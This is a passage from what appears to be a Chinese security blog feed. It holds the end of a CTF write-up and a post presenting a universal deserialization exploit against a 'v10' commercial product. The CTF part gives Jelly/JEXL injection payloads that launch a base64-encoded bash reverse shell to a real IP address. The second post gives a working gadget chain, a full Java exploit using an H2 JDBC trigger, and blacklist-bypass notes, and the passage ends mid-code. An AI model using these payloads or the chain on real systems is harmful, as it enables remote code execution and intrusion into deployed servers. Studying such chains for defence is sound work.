title="解题思路2"></a>解题思路2</h3><p><strong>思路：jexl表达式注入</strong></p><p>exp2.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:jelly</span> <span class="attr">xmlns:j</span>=<span class="string">&quot;jelly:core&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">j:getStatic</span> <span class="attr">var</span>=<span class="string">&quot;str&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">className</span>=<span class="string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="attr">field</span>=<span class="string">&quot;REQUEST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">j:break</span> <span class="attr">test</span>=<span class="string">&quot;$&#123;str .class</span></span></span><br><span class="line"><span class="string"><span class="tag">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance() .getEngineByName(&#x27;js&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="tag">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="symbol">&amp;quot;</span> bash -c `&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzguNzEvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;` <span class="symbol">&amp;quot;</span>)&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">j:break</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">j:jelly</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另一个payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:jelly</span> <span class="attr">xmlns:j</span>=<span class="string">&quot;jelly:core&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:getStatic</span> <span class="attr">var</span>=<span class="string">&quot;str&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">className</span>=<span class="string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="attr">field</span>=<span class="string">&quot;REQUEST&quot;</span>/&gt;</span> <span class="tag">&lt;<span class="name">j:whitespace</span>&gt;</span>$&#123;str</span><br><span class="line">.class</span><br><span class="line">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance() .getEngineByName(&#x27;js&#x27;)</span><br><span class="line">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="symbol">&amp;quot;</span>  bash -c `&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzguNzEvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;` <span class="symbol">&amp;quot;</span>)&#x27;)&#125;<span class="tag">&lt;/<span class="name">j:whitespace</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">j:jelly</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/05912db436951a1e3034029919e75d82.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>官方wp：道格安全公众号</li><li>悠悠神的wp</li><li>p2zhh爷的wp</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>某v10 channel 反序列化 出网通杀</title>
    <link href="https://jaspersec.top/posts/1135273246.html"/>
    <id>https://jaspersec.top/posts/1135273246.html</id>
    <published>2024-08-20T17:57:00.000Z</published>
    <updated>2025-03-31T22:09:47.238Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。</p><h3 id="Hashtable链"><a href="#Hashtable链" class="headerlink" title="Hashtable链"></a>Hashtable链</h3><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>利用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject -&gt; </span><br><span class="line">Hashtable#reconstitutionPut -&gt; </span><br><span class="line">abstractMap#equals -&gt; </span><br><span class="line">TextAndMnemonicHashMap#get -&gt; </span><br><span class="line">com.fr.json.JSONArray#toString -&gt;  com.fr.third.alibaba.druid.pool.xa.DruidXADataSource#getXConnection</span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1826</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure><p>EXP（h2 jdbc attack）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">//        System.out.println(gzipWrapper(payload));</span></span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="问题一：为什么要设置setter"><a href="#问题一：为什么要设置setter" class="headerlink" title="问题一：为什么要设置setter"></a>问题一：为什么要设置setter</h4><p>setUrl最简单，因为要触发jdbc attack，而其他三个setter的作用则要分析一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">druidXADataSource.setUrl(url);</span><br></pre></td></tr></table></figure><p>setLogWriter(null)、setStatLogger(null)是因为，在DruidXADataSource的对象被序列化的时候，会递归序列化其所有fields，而其中的logWriter和statLogger并未实现Serializable接口，于是在递归序列化的时候报错NoSerializable，设置成null就不会再判断是否可序列化，也就bypass了</p><p>断点打在ObjectOutputStream#1548，条件断点寻找所有未实现Serializable接口的Field：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objVals[i] != null &amp;&amp; (obj.hashCode() == 509886383) &amp;&amp; !(objVals[i] instanceof Serializable)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/88148d3c0a0fb06ce6dfe4928810a7f5.png"></p><p>setInitialSize(1)的原因则和反序列化有关，首先测试可以发现，直接调getXConnection()是可以打通的，但是反序列化调用就打不通了，于是开始对比分析：</p><p>直接 getXConnection 触发jdbc attack的调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getConnectionInternal:<span class="number">1674</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnectionDirect:<span class="number">1504</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1484</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">main:<span class="number">34</span>, h2Attack (org.example)</span><br></pre></td></tr></table></figure><p>而反序列化去触发jdbc attack时，在DruidDataSource#init中，原本在构造函数里初始化了的this.initedLatch变成了null，这导致它在调用await函数时抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/13d4416914c282ad6ae1ab5b86649ea7.png"></p><p>而如果this.init()过不去，自然就无法执行到this.getConnectionDirect()，也就导致反序列化无法和直接调用getXConnection一样触发jdbc attack，如下图所示<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c98959e2d1453085e954b78c3e29d3f8.png"></p><p>解决方案是druidXADataSource.setInitialSize(1)，同样是在this.init()函数里，在调用this.initedLatch.await()之前存在下面的代码段，原本这个while循环因为条件不符直接跳过，但是如果设置了initialSize，则可以执行到this.createPhysicalConnection()，<strong>而这个函数同样可以打jdbc attack</strong>（这里比较奇特，不太清楚怎么发现的）<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22c4a8d04a1723648cebec9db017ba91.png"></p><p>调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1694</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">createPhysicalConnection:<span class="number">1794</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure><h4 id="问题二：为什么Map前后put两次"><a href="#问题二：为什么Map前后put两次" class="headerlink" title="问题二：为什么Map前后put两次"></a>问题二：为什么Map前后put两次</h4><p>和CC7类似，textAndMnemonicHashMap在hashtableput的前后put了两次，并且value先异后同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line">...略</span><br><span class="line">hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);  </span><br><span class="line">hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line">...略</span><br><span class="line">textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>这样构造本质还是因为hashtable.readObject触发的reconstitutionPut，简单说reconstitutionPut方法就是把一个个反序列化后的Map存入tab，而存入时自然会判断是否有冲突，于是使用hash和equals来做判断，我们利用的也是这个点。</p><p>目标是执行到AbstactMap#equals，但在此之前需要判断e.hash和key.hashCode()是否相等，只有相等才能走到equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/108a5bbd5d306a242589c7eb4b4daae1.png"></p><p>而key.hashCode()实际上就是 key.hash ^ value.hash，而e.hash则是上一个存入tab的textAndMnemonicHashMap1的key.hashCode()，那么想执行equals需要两个entry的key和value一致，这解释payload为什么设置两个null。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fe0573e5365ab908406f5381ca9af935.png"></p><p>在设置两个null之前，value先设置成不同的值，则是为避免提前触发链子，因为hashtable在put时会触发同样的equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a66400a2ad6bc02c4afa1fd16290a7b.png"></p><h4 id="问题三：为什么设置loadFactor"><a href="#问题三：为什么设置loadFactor" class="headerlink" title="问题三：为什么设置loadFactor"></a>问题三：为什么设置loadFactor</h4><p>因为不加会报错，给出了错误提示0.0<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/14b38698a00b7de4312bc7547742e614.png"><br>这个调试一下就知道了，不加loadFactor没办法反序列化&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fc165e18bc3f42368c6c40195f6d647b.png"></p><h3 id="HashMap链"><a href="#HashMap链" class="headerlink" title="HashMap链"></a>HashMap链</h3><p>略</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="hsql"><a href="#hsql" class="headerlink" title="hsql"></a>hsql</h3><p>v10的最新版默认内置hsql和jdk8u191，所以考虑打hsql jdbc attack，通过调用Java静态函数lookup去打jndi，然后因为是高版本jdk所以再打ldap反序列化，这样反序列化就不受 blacklist.txt 限制，黑名单里随便找个链子反序列化即可。</p><p><strong>坑点：</strong></p><ol><li>指定的hsql数据库的目录必须存在且有权限写文件，并且之前最好没写过数据</li><li>现成工具无法直接利用，因为官方包和fr开头的包不一样，这里魔改 JNDIMap，把fr包打进去实现利用</li><li>最新的v10不带BeanUtils了，这里我用的jackson</li></ol><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span 